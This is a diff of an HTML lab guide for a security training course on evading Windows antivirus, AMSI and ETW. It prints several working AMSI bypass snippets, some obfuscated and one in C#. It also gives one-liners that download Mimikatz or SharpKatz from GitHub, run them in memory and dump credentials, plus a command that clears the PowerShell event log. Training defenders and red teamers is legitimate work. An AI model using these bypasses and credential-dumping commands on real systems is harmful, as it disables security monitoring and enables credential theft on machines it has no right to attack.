@@ -152,7 +152,21 @@
                     <main>
                         <h1><a class="header" href="#intro--threathunting-academy---evasion" id="intro--threathunting-academy---evasion">Intro : Threathunting Academy - Evasion</a></h1>
 <p><img src="./images/cr_hackers.jpg" alt="image" /></p>
-<p>Welcome to the <strong>&quot;Threathunting Academy - Evasion&quot;</strong>  this is the official lab guide that will guide you through the infrastructure. Students will all have their own <strong>Windows 10 client machine</strong>, a shared central <code>Domain Controller</code> and a Kali <code>Red Team server and Forensics machine</code>. All logs are centrally collected on and Ubuntu server running Elasticsearch and Kibana.</p>
+<p>Welcome to the <strong>&quot;Threathunting Academy - Evasion&quot;</strong>  this is the official lab guide that will guide you through the infrastructure. Students will all have their own <strong>Windows 10 client machine</strong>, a shared central <code>Domain Controller</code> and a <strong>Kali</strong> <code>Red Team server and Forensics machine</code>. All logs are centrally collected on and Ubuntu server running Elasticsearch and Kibana.</p>
+<p><strong>What you will learn in this training:</strong></p>
+<ul>
+<li>How attack frameworks work</li>
+<li>AV and EDR internals and how to evade them
+<ul>
+<li>Windows Defender, AMSI and ETW basics and evasion</li>
+</ul>
+</li>
+<li>Powershell based attacks (in-mempry) </li>
+<li>How signature based detection works and how to evade</li>
+<li>What Shellcode is, how to build and use shellcode</li>
+<li>Build your own evasive shellcode loader</li>
+<li>Build your own Forensics Lab</li>
+</ul>
 <h1><a class="header" href="#havoc-c2" id="havoc-c2">Havoc C2</a></h1>
 <p>With a phletora of attack frameworks available (https://howto.thec2matrix.com), the most important requirement is <em>malleability/customizability</em>. Commonly known frameworks such as <code>metasploit</code>, <code>cobalt strike</code>, <code>Empire</code> (Starkiller GUI), <code>BruteRatel</code>, <code>Mythic C2</code>, <code>Covenant</code> and <code>Sliver</code> come to mind. </p>
 <p><img src="./images/c2matrix.jpg" alt="Screenshot" /></p>
@@ -491,15 +505,14 @@ AssemblyLoad</p>
 <blockquote>
 <p>Runtime – Antimalware Scanning for All Assemblies
 In previous versions of .NET Framework, Windows Defender or third-party antimalware software would automatically scan all assemblies loaded from disk for malware. However, assemblies loaded from elsewhere, such as by using Assembly.Load(byte[]), would not be scanned and could potentially carry viruses undetected.</p>
-<p>.NET Framework 4.8 (released April 18th on Windows 10 triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.</p>
+<p>.NET Framework 4.8 (released April 18th on Windows 10) triggers scans for those assemblies by Windows Defender and many other antimalware solutions that implement the Antimalware Scan Interface. We expect that this will make it harder for malware to disguise itself in .NET programs.</p>
 <p><strong>LINK</strong> : <a href="https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/">https://devblogs.microsoft.com/dotnet/announcing-net-framework-4-8-early-access-build-3694/</a></p>
 <p><strong>LINK</strong> : <a href="https://en.wikipedia.org/wiki/.NET_Framework_version_history">https://en.wikipedia.org/wiki/.NET_Framework_version_history</a></p>
 </blockquote>
 <p><img src="./images/amsi7archi.jpg" alt="image" /></p>
 <h2><a class="header" href="#supported-os" id="supported-os">Supported OS</a></h2>
 <ul>
-<li>Windows 10 PRO/ENTERPRISE and Windows Server 2016</li>
-<li>Windows Server 2019</li>
+<li>Windows 10 PRO/ENTERPRISE and Windows Server 2016 and later</li>
 </ul>
 <h2><a class="header" href="#supported-3rd-party-antivirusedr-vendors" id="supported-3rd-party-antivirusedr-vendors">Supported 3rd party Antivirus/EDR vendors</a></h2>
 <ul>
@@ -510,6 +523,7 @@ In previous versions of .NET Framework, Windows Defender or third-party antimalw
 <li>McAfee Endpoint Security 10.6.0 </li>
 <li>Sophos</li>
 <li>Symantec (v14.3 and later)</li>
+<li>and a lot more...</li>
 </ul>
 <p><strong>LINK</strong> : <a href="https://github.com/subat0mik/whoamsi">https://github.com/subat0mik/whoamsi</a></p>
 <p>To check which version of .net and the CLR is installed open a powershell prompt and type the following:</p>
@@ -519,152 +533,75 @@ $dotnet = [System.Reflection.Assembly]::Load(&quot;mscorlib&quot;)
 $dotnet.GetName().Version
 </code></pre>
 <p><img src="./images/dotnetversion.jpg" alt="image" /></p>
+<p>Let's see if our AMSI engine is working properly by doing a simple AMSI Test Sample (comparable to EICAR):</p>
 <h2><a class="header" href="#amsitest" id="amsitest">AMSITEST</a></h2>
-<pre><code class="language-yaml">It '&quot;Antimalware Scan Interface&quot; is working' {
-    # AMSI test string 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
-    # (in the following as an obfuscated string)
-    # must throw an error if executed (blocked by AMSI)
-    $TestString = &quot;FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ=&quot;
-    $Bytes = [Convert]::FromBase64String($TestString)
-    $String = -join ($bytes | ForEach-Object { [char]($_ -bxor 0x33)})
-    { Invoke-Expression -Command $String } | Should Throw
-}
+<pre><code class="language-yaml">Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
 </code></pre>
-<h2><a class="header" href="#amsibypass" id="amsibypass">AMSIBYPASS</a></h2>
+<p><img src="./images/amsitest.jpg" alt="image" /></p>
+<p>Even funnier, when you run the following command in a powershell console, AMSI will flag it as malicious, although the powershell script is not even available on your windows machine:</p>
+<pre><code class="language-yaml">Invoke-Mimikatz
+</code></pre>
+<p><img src="./images/amsimimi.jpg" alt="image" /></p>
 <blockquote>
-<p>This bypass does not require administrator rights!!!</p>
+<p><strong>Bypassing AMSI and how it works</strong></p>
 </blockquote>
-<p>Works on 1903, 1909 and before</p>
-<pre><code class="language-yaml">sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  &quot;{1}{0}&quot;-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( &quot;1Q2U&quot;  +&quot;zX&quot;  )  -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f'amsi','d','InitFaile'  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f 'Stat','i','NonPubli','c','c, ' )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
+<p>As a first check, let's see in which process AMSI.dll has been loaded. Open a powershell prompt:</p>
+<pre><code class="language-powershell">Get-Process | where {$_.modules.ModuleName -eq 'Amsi.dll'}
 </code></pre>
-<p>List <code>dirty</code> words: </p>
-<pre><code class="language-yaml">[ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
+<p><img src="./images/ps_amsips.jpg" alt="image" /></p>
+<p>We can also use <code>SystemInformer</code> (previously known as <code>Process Hacker</code>) to verify, open <code>System Informer</code>, scroll down to your powershell process, right-click and select <code>properties</code>:</p>
+<p><img src="./images/ps_si_ps.jpg" alt="image" /></p>
+<p>Go to the <code>modules</code> tab, this will show all dll's loaded by the process, you will find the amsi.dll there indeed!</p>
+<p><img src="./images/ps_si_amsi.jpg" alt="image" /></p>
+<p>We're going to have a closer look at that AMSI.dll and see which functions it exports (more on functions later - just know that a windows program will load certain dll's from disk - these dll's contain common functions that Microsoft has made avaiable to make life a bit easier for developers :))</p>
+<p><strong>Pre-requisites</strong>: dumpbin.exe /exports file.dll (requires visual studio c++ and msvc v142)</p>
+<p><img src="./images/msvc142.jpg" alt="Screenshot" /></p>
+<p><img src="./images/msvc_vs_dumpbin.jpg" alt="Screenshot" /></p>
+<p>Open the &quot;Developer Command Prompt for Visual Studio 2019&quot;</p>
+<p><img src="./images/ps_devprompt.jpg" alt="image" /></p>
+<p>If we have a look at the amsi.dll's exported functions using dumpbin we see the forllowing functions are avaiable:</p>
+<pre><code class="language-bash">dumpbin c:\windows\system32\amsi.dll /exports
 </code></pre>
-<hr />
-<p>https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patch-the-providers-DLL-of-Microsoft-MpOav.dll</p>
-<p>check which processes have amsi.dll loaded</p>
-<p>Get-Process | where {$_.modules.ModuleName -eq 'Amsi.dll'}</p>
-<p>Los er door:</p>
-<pre><code class="language-powershell">$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
-$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
-$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
-$field.SetValue($null,$true)
+<pre><code class="language-bash">ordinal hint RVA      name
+
+          1    0 00003860 AmsiCloseSession
+          2    1 000034E0 AmsiInitialize
+          3    2 00003800 AmsiOpenSession
+ [+]      4    3 00003880 AmsiScanBuffer -&gt; scans the content of buffers
+ [+]      5    4 00003980 AmsiScanString -&gt; scans the content of strings (variables)
+          6    5 000039E0 AmsiUacInitialize
+          7    6 00003C60 AmsiUacScan
+          8    7 00003C00 AmsiUacUninitialize
+          9    8 000037A0 AmsiUninitialize
+         10    9 00001B00 DllCanUnloadNow
+         11    A 00001B40 DllGetClassObject
+         12    B 00001C80 DllRegisterServer
+         13    C 00001C80 DllUnregisterServer
 </code></pre>
-<p>https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b</p>
-<p>And finally AMSI.FAIL</p>
-<p>or this also works</p>
-<pre><code class="language-powershell">class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
-$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
-$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
-#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
-#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
-[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
+<p>We can see here the AmsiScanBuffer and AmsiScanString functions we talked about earlier. So the question is, how to we bypass this functionality?</p>
+<p>Luckily there are a ton of AMSI bypasses publicly available : (<a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell</a>)</p>
+<p>In our next lab we'll be using &quot;Matt Graebers Reflection method&quot;, it's a simple one-liner which uses reflection to set the <code>amsiInitFailed</code> field to <code>$true</code>, and will also work in .NET binaries, not just in PowerShell. Let's have a look how it works before we implement it.</p>
+<p><img src="./images/amsi_gitbypasses.jpg" alt="image" /></p>
+<p><strong>&quot;Matt Graebers Reflection method&quot;</strong></p>
+<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 </code></pre>
-<p>then run</p>
-<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
-</code></pre>
-<p>No detections, AMSI is disabled</p>
-<h2><a class="header" href="#amsi-bypass-in-net-binaries" id="amsi-bypass-in-net-binaries">AMSI Bypass in .NET Binaries</a></h2>
-<p>Yes, the AMSI bypass technique provided, which uses reflection to set the <code>amsiInitFailed</code> field to <code>$true</code>, will also work in .NET binaries, not just in PowerShell.</p>
-<p><strong>Understanding the Technique:</strong></p>
-<ul>
+<h3><a class="header" href="#understanding-the-technique" id="understanding-the-technique">Understanding the Technique:</a></h3>
+<p><strong>How it Works in <code>powershell</code>:</strong></p>
+<ol>
 <li><strong>Reflection:</strong> The core of this bypass relies on .NET reflection, which allows code to inspect and modify types, fields, and methods at runtime.</li>
 <li><strong>Targeting <code>amsiInitFailed</code>:</strong> The code specifically targets the <code>amsiInitFailed</code> static field within the <code>System.Management.Automation.AmsiUtils</code> class. This field is used to indicate whether the AntiMalware Scan Interface (AMSI) initialization has failed.</li>
 <li><strong>Setting to <code>$true</code>:</strong> By setting this field to <code>$true</code>, the code effectively tells the .NET runtime that AMSI initialization has failed, causing AMSI scans to be skipped.</li>
-</ul>
-<p><strong>How it Works in .NET Binaries:</strong></p>
+</ol>
+<p><strong>How it Works in <code>.NET Binaries</code>:</strong></p>
 <ol>
 <li><strong>Locating <code>AmsiUtils</code>:</strong> Just like in PowerShell, you can use reflection in C# (or other .NET languages) to locate the <code>System.Management.Automation.AmsiUtils</code> class.</li>
 <li><strong>Accessing <code>amsiInitFailed</code>:</strong> You can then use reflection to access the <code>amsiInitFailed</code> static field.</li>
 <li><strong>Setting the Value:</strong> Finally, you can use reflection to set the value of the <code>amsiInitFailed</code> field to <code>true</code>.</li>
 </ol>
-<p><strong>C# Example:</strong></p>
-<pre><code class="language-csharp">using System;
-using System.Reflection;
-
-public class AmsiBypass
-{
-    public static void Main(string[] args)
-    {
-        try
-        {
-            // Get the AmsiUtils type
-            Type amsiUtilsType = typeof(System.Management.Automation.AmsiUtils);
-
-            // Get the amsiInitFailed field
-            FieldInfo amsiInitFailedField = amsiUtilsType.GetField(&quot;amsiInitFailed&quot;, BindingFlags.NonPublic | BindingFlags.Static);
-
-            // Set the amsiInitFailed field to true
-            if (amsiInitFailedField != null)
-            {
-                amsiInitFailedField.SetValue(null, true);
-                Console.WriteLine(&quot;AMSI bypassed.&quot;);
-            }
-            else
-            {
-                Console.WriteLine(&quot;amsiInitFailed field not found.&quot;);
-            }
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($&quot;Error: {ex.Message}&quot;);
-        }
-    }
-}
-</code></pre>
-<h2><a class="header" href="#key-considerations" id="key-considerations">Key Considerations:</a></h2>
-<ul>
-<li><strong>Assembly Loading:</strong>
-<ul>
-<li>If your .NET binary doesn't already have <code>System.Management.Automation.dll</code> loaded, you may need to load it explicitly using <code>Assembly.Load()</code> or related methods.</li>
-</ul>
-</li>
-<li><strong>.NET Version Compatibility:</strong>
-<ul>
-<li>Ensure that the reflection code is compatible with the .NET Framework or .NET Core/.NET 5+ version that the target binary is using.</li>
-</ul>
-</li>
-<li><strong>Security Implications:</strong>
-<ul>
-<li>AMSI bypass techniques can be used for malicious purposes. Use them responsibly and ethically.</li>
-</ul>
-</li>
-<li><strong>EDR Detection:</strong>
-<ul>
-<li>Modern EDR solutions are designed to detect such reflection-based attacks. They often monitor for suspicious memory modifications and code behavior.</li>
-</ul>
-</li>
-<li><strong>Finding the correct assembly:</strong>
-<ul>
-<li>In some .net applications, the <code>System.Management.Automation.dll</code> may not be loaded. If this is the case, you will need to load it.</li>
-</ul>
-</li>
-</ul>
-<p><strong>In summary:</strong> The AMSI bypass technique using reflection is not limited to PowerShell and can be successfully implemented in .NET binaries.</p>
-<hr />
-<h1><a class="header" href="#dotnet-packing" id="dotnet-packing">dotnet packing</a></h1>
-<p>ConfuserEx
-Babel</p>
-<hr />
-<p>https://github.com/pracsec/AmsiScanner/tree/main/src</p>
-<p>https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patching-Clr</p>
-<pre><code class="language-powershell">$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
-
-[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiSession&quot;,&quot;NonPublic,Static&quot;).SetValue($null, $null);[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiContext&quot;,&quot;NonPublic,Static&quot;).SetValue($null, [IntPtr]$mem)
-</code></pre>
-<p>Use this one:</p>
-<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-</code></pre>
 <blockquote>
-<p>Invoke-obfuscation
-set scriptblock [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-token
-string
-2</p>
+<p><strong>NOTE</strong>: Modern <code>EDR</code> solutions are designed to detect such reflection-based attacks. They often monitor for suspicious memory modifications and code behavior. <code>EDR</code>'s will hook functions and rely heavily on telemtry such as <code>ETW providers</code> (<em><strong>hint</strong></em> <em><strong>hint</strong></em>), of course these can also be bypassed. For now we focus on AV bypassing. </p>
 </blockquote>
-<p>output =</p>
-<pre><code class="language-powershell">[Ref].Assembly.GetType((&quot;{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}&quot;-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField((&quot;{0}{1}{2}&quot; -f 'amsi','InitFa','iled'),(&quot;{1}{0}{4}{2}{3}&quot; -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
-</code></pre>
+<p>In the next chapter we will briefly go over ETW and then we'll apply our knowledge on how to bypass <code>AMSI</code> and <code>ETW</code> in our next lab!</p>
 <h1><a class="header" href="#etw---event-tracing-for-windows-kernel-mode" id="etw---event-tracing-for-windows-kernel-mode">ETW - Event Tracing for Windows (Kernel mode)</a></h1>
 <blockquote>
 <p><strong>TL;DR</strong> ETW basically is a kernel level debug logging mechanism in Windows - it allows to gather advanced telemetry about functions being called. <code>Windows Event Logs</code> contain a subset of ETW events. Typically used by application developers to debug programs, but has found its way as a telemetry source for <code>EDR's</code>. </p>
@@ -908,7 +845,7 @@ public class EtwBypass
 <p>Use PSEXEC to run as system and run Telemetry Sourceror</p>
 <hr />
 <p>ETW USER LAND vs KERNEL MODE</p>
-<h1><a class="header" href="#powershell" id="powershell">Powershell</a></h1>
+<h1><a class="header" href="#powershell-lab---bypassing-amsi-and-etw" id="powershell-lab---bypassing-amsi-and-etw">Powershell Lab - Bypassing AMSI and ETW</a></h1>
 <blockquote>
 <p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <code>Virus Total</code> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
 Make sure at all times that sample submussion in Microsoft Defender is turned off, and if for some reason you get prompted to submit a sample, deny the request.</p>
@@ -966,11 +903,12 @@ Get-MpThreat
 <p>Now from the same powershell terminal, run SharpKatz from memory with IEX (Invoke Expression)</p>
 <pre><code class="language-Powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/crimsoncore/Invoke-SharpKatz/refs/heads/main/Invoke-SharpKatz.ps1&quot;);Invoke-SharpKatz
 </code></pre>
-<p>We'll see the script won't execute since AMSI has scanned it and determined it as malicious:</p>
+<p>We'll see the script won't execute since AMSI intercepted it before executing and has sent it to Defender that scanned it and determined it as malicious:</p>
 <p><img src="./images/ps_invokesharkpkatzblocked.jpg" alt="image" /></p>
 <p>Let's have a look at the EventViewer logs - open EventViewer, select <strong>&quot;Application and Services Logs&quot;</strong>, <strong>&quot;Microsoft&quot;</strong>,<strong>&quot;Windows&quot;</strong>, <strong>&quot;Powershell&quot;</strong> and finally <strong>&quot;Operational&quot;</strong>.</p>
 <p><img src="./images/ps_eventvwr.jpg" alt="image" /></p>
-<p><strong>AMSI Bypass</strong></p>
+<p>OK, so now what?</p>
+<p><strong>Bypassing AMSI - How it works</strong></p>
 <p>Let's clear the powershell event logs again:</p>
 <pre><code class="language-powershell">wevtutil cl &quot;Microsoft-Windows-PowerShell/Operational&quot;
 </code></pre>
@@ -994,6 +932,7 @@ string
 </code></pre>
 <p>And let's try that Invoke-SharpKatz again, if all goes well, AMSI should be patched and the script will run:</p>
 <p>Success!!!</p>
+<hr />
 <p>However bypassing AMSI doesn't disable eventlogs - which are useful telemetry for EDR's, SIEM's and UEBA's. Let's open Eventviewer again and see what was logged.</p>
 <p>A very cool Forensics tools that can anaylyze powershell logs is <code>Powershell-Hunter</code> - if we run this on our powershell logs it will also flag some suspicious commands.</p>
 <p>Ideally we don't want any of these logs to be generated and thus shutting off the telemety for security solutions, we can do this by patchin ETW (Event Tracing for Windows).</p>
@@ -1081,6 +1020,123 @@ $f.SetValue($null,$true);
 </code></pre>
 <p><a href="https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c">https://medium.com/@0xHossam/powershell-exploits-modern-apts-and-their-malicious-scripting-tactics-7f98b0e8090c</a></p>
 <p>includes c-code!!!</p>
+<h2><a class="header" href="#amsibypass" id="amsibypass">AMSIBYPASS</a></h2>
+<blockquote>
+<p>This bypass does not require administrator rights!!!</p>
+</blockquote>
+<p>Works on 1903, 1909 and before</p>
+<pre><code class="language-yaml">sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  &quot;{1}{0}&quot;-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( &quot;1Q2U&quot;  +&quot;zX&quot;  )  -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f'amsi','d','InitFaile'  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f 'Stat','i','NonPubli','c','c, ' )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
+</code></pre>
+<p>List <code>dirty</code> words: </p>
+<pre><code class="language-yaml">[ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
+</code></pre>
+<hr />
+<p>Los er door:</p>
+<pre><code class="language-powershell">$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
+$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
+$field.SetValue($null,$true)
+</code></pre>
+<p>https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b</p>
+<p>And finally AMSI.FAIL</p>
+<p>or this also works</p>
+<pre><code class="language-powershell">class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
+$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
+$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
+#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
+[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
+</code></pre>
+<p>then run</p>
+<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
+</code></pre>
+<p><strong>C# Example:</strong></p>
+<pre><code class="language-csharp">using System;
+using System.Reflection;
+
+public class AmsiBypass
+{
+    public static void Main(string[] args)
+    {
+        try
+        {
+            // Get the AmsiUtils type
+            Type amsiUtilsType = typeof(System.Management.Automation.AmsiUtils);
+
+            // Get the amsiInitFailed field
+            FieldInfo amsiInitFailedField = amsiUtilsType.GetField(&quot;amsiInitFailed&quot;, BindingFlags.NonPublic | BindingFlags.Static);
+
+            // Set the amsiInitFailed field to true
+            if (amsiInitFailedField != null)
+            {
+                amsiInitFailedField.SetValue(null, true);
+                Console.WriteLine(&quot;AMSI bypassed.&quot;);
+            }
+            else
+            {
+                Console.WriteLine(&quot;amsiInitFailed field not found.&quot;);
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($&quot;Error: {ex.Message}&quot;);
+        }
+    }
+}
+</code></pre>
+<h2><a class="header" href="#key-considerations" id="key-considerations">Key Considerations:</a></h2>
+<ul>
+<li><strong>Assembly Loading:</strong>
+<ul>
+<li>If your .NET binary doesn't already have <code>System.Management.Automation.dll</code> loaded, you may need to load it explicitly using <code>Assembly.Load()</code> or related methods.</li>
+</ul>
+</li>
+<li><strong>.NET Version Compatibility:</strong>
+<ul>
+<li>Ensure that the reflection code is compatible with the .NET Framework or .NET Core/.NET 5+ version that the target binary is using.</li>
+</ul>
+</li>
+<li><strong>Security Implications:</strong>
+<ul>
+<li>AMSI bypass techniques can be used for malicious purposes. Use them responsibly and ethically.</li>
+</ul>
+</li>
+<li><strong>EDR Detection:</strong>
+<ul>
+<li></li>
+</ul>
+</li>
+<li><strong>Finding the correct assembly:</strong>
+<ul>
+<li>In some .net applications, the <code>System.Management.Automation.dll</code> may not be loaded. If this is the case, you will need to load it.</li>
+</ul>
+</li>
+</ul>
+<p><strong>In summary:</strong> The AMSI bypass technique using reflection is not limited to PowerShell and can be successfully implemented in .NET binaries.</p>
+<hr />
+<h1><a class="header" href="#dotnet-packing" id="dotnet-packing">dotnet packing</a></h1>
+<p>ConfuserEx
+Babel</p>
+<hr />
+<p>https://github.com/pracsec/AmsiScanner/tree/main/src</p>
+<p>https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patching-Clr</p>
+<pre><code class="language-powershell">$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+
+[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiSession&quot;,&quot;NonPublic,Static&quot;).SetValue($null, $null);[Ref].Assembly.GetType(&quot;System.Management.Automation.AmsiUtils&quot;).GetField(&quot;amsiContext&quot;,&quot;NonPublic,Static&quot;).SetValue($null, [IntPtr]$mem)
+</code></pre>
+<p>Use this one:</p>
+<pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+</code></pre>
+<blockquote>
+<p>Invoke-obfuscation
+set scriptblock [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+token
+string
+2</p>
+</blockquote>
+<p>output =</p>
+<pre><code class="language-powershell">[Ref].Assembly.GetType((&quot;{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}&quot;-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField((&quot;{0}{1}{2}&quot; -f 'amsi','InitFa','iled'),(&quot;{1}{0}{4}{2}{3}&quot; -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
+</code></pre>
 <h1><a class="header" href="#static-analysis" id="static-analysis">Static Analysis</a></h1>
 <blockquote>
 <p><strong>TL;DR</strong> In this chapter we'll have a look at basic signature based AV evasion techniques. We'll use <code>strings.exe</code> and <code>yara</code> to explain the basic principles of pattern matching and modify existing malicious tools to bypass signature based detections.</p>
@@ -2037,80 +2093,63 @@ uac-bypass silentcleanup /opt/havoc/payloads/demon.x64.exe -&gt; error
 <p>x64dbg</p>
 <p>HookChecker mr. Un1c0d3r</p>
 <p>dump exported funtions ntdll.dll kernelbase.dll kernel32.dll</p>
-<p>command prompt visual studio 2019</p>
-<p>dumpbin.exe /exports file.dll (requires visual studio c++ and msvc v142)</p>
-<p><img src="./images/msvc142.jpg" alt="Screenshot" /></p>
-<p><img src="./images/msvc_vs_dumpbin.jpg" alt="Screenshot" /></p>
-<p>Open Developer <code>Command Prompt Visual studio 2019</code></p>
-<pre><code class="language-bash">dumpbin c:\windows\system32\amsi.dll /exports
-</code></pre>
-<pre><code class="language-bash">ordinal hint RVA      name
+<pre><code>
+Screenshot IDA JUMP
 
-          1    0 00003860 AmsiCloseSession
-          2    1 000034E0 AmsiInitialize
-          3    2 00003800 AmsiOpenSession
- [+]      4    3 00003880 AmsiScanBuffer
- [+]      5    4 00003980 AmsiScanString
-          6    5 000039E0 AmsiUacInitialize
-          7    6 00003C60 AmsiUacScan
-          8    7 00003C00 AmsiUacUninitialize
-          9    8 000037A0 AmsiUninitialize
-         10    9 00001B00 DllCanUnloadNow
-         11    A 00001B40 DllGetClassObject
-         12    B 00001C80 DllRegisterServer
-         13    C 00001C80 DllUnregisterServer
-</code></pre>
-<p>Screenshot IDA JUMP</p>
-<p>https://github.com/Almorabea/HookSweeper</p>
-<p>https://github.com/Mr-Un1k0d3r/EDRs
-Hook_finder64.exe</p>
-<p>https://github.com/asaurusrex/Probatorum-EDR-Userland-Hook-Checker
-compile in visual studio</p>
-<p>Bitdefender install -&gt; 102 fnctions hooked</p>
-<p>windgb:
+https://github.com/Almorabea/HookSweeper
+
+
+https://github.com/Mr-Un1k0d3r/EDRs
+Hook_finder64.exe
+
+https://github.com/asaurusrex/Probatorum-EDR-Userland-Hook-Checker
+compile in visual studio
+
+Bitdefender install -&gt; 102 fnctions hooked
+
+windgb:
 u NtOpenProcess
 !chkimg ntdll
 needs symbols in windbg
 .sympath srv*https://msdl.microsoft.com/download/symbols
-!sym noisy;.reload /f /v</p>
-<pre><code>u NtReadVirtualMemory
+ !sym noisy;.reload /f /v
+
+
+</code></pre>
+<p>u NtReadVirtualMemory
 ntdll!NtReadVirtualMemory:
-00007ffd`3ef0dcc0 e95b331600      jmp     00007ffd`3f071020
-00007ffd`3ef0dcc5 cc              int     3
-00007ffd`3ef0dcc6 cc              int     3
-00007ffd`3ef0dcc7 cc              int     3
